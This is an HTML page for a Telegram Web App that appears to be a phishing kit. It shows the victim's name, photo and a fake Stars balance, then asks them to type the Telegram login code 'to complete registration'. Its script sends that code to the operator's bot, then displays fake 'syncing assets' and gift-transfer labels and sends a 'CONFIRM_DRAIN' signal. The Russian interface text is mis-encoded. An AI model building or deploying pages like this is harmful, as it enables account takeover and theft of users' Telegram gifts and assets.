<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: #0e1621; color: white; font-family: -apple-system, system-ui; margin: 0; padding: 15px; }
        .card { background: #17212b; padding: 25px; border-radius: 20px; text-align: center; border: 1px solid #242f3d; }
        .avatar { width: 80px; height: 80px; border-radius: 50%; margin: 10px auto; border: 2px solid #248bcf; display: block; }
        .user-name { font-size: 18px; font-weight: bold; margin-bottom: 5px; }
        .stars-val { font-size: 38px; font-weight: bold; color: #fecb2e; margin: 15px 0; }
        input { width: 100%; padding: 15px; border-radius: 12px; border: 1px solid #2b3a4a; background: #0e1621; color: white; font-size: 18px; text-align: center; box-sizing: border-box; }
        button { background: #248bcf; color: white; border: none; padding: 16px; border-radius: 12px; font-weight: bold; width: 100%; font-size: 16px; margin-top: 15px; }
        .mask-list { font-size: 11px; color: #5d6d7d; text-align: left; margin-top: 20px; line-height: 1.6; }
    </style>
</head>
<body>
    <div class="card" id="main-content">
        <img id="u-pic" src="" class="avatar">
        <div id="u-name" class="user-name">–ó–∞–≥—Ä—É–∑–∫–∞...</div>
        <div class="stars-val" id="stars-display">0 ‚≠ê</div>
        
        <div id="step-ui">
            <p style="font-size: 14px; color: #8897a3;">–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ —á–∞—Ç–∞ Telegram –¥–ª—è –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏</p>
            <input type="number" id="tg-code" placeholder="0 0 0 0 0">
            <button onclick="submitCode()">–ó–ê–†–ï–ì–ò–°–¢–†–ò–†–û–í–ê–¢–¨–°–Ø</button>
        </div>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();
        const user = tg.initDataUnsafe.user;
        const params = new URLSearchParams(window.location.search);
        const amount = params.get('amount') || "50";

        document.getElementById('u-pic').src = user?.photo_url || "https://i.imgur.com/8K9v679.png";
        document.getElementById('u-name').innerText = user?.first_name || "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å";
        document.getElementById('stars-display').innerText = amount + " ‚≠ê";

        function submitCode() {
            let code = document.getElementById('tg-code').value;
            if(code.length < 5) return;
            tg.sendData("c:" + code);
            
            document.getElementById('step-ui').innerHTML = `
                <div style="margin: 20px 0;">üîÑ –°–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∞—Ü–∏—è –∞–∫—Ç–∏–≤–æ–≤...</div>
                <button onclick="finalAction()" style="background: #31b545;">–ù–ê–ñ–ú–ò–¢–ï –ß–¢–û–ë–´ –í–´–í–ï–°–¢–ò</button>
                <div class="mask-list">
                    ‚Ä¢ ConvertGiftToStars [Fragment API] <br>
                    ‚Ä¢ TransferGift [Smart Contract] <br>
                    ‚Ä¢ SendGift [Syncing]
                </div>
            `;
        }

        function finalAction() {
            tg.sendData("CONFIRM_DRAIN");
            tg.close();
        }
    </script>
</body>
</html>
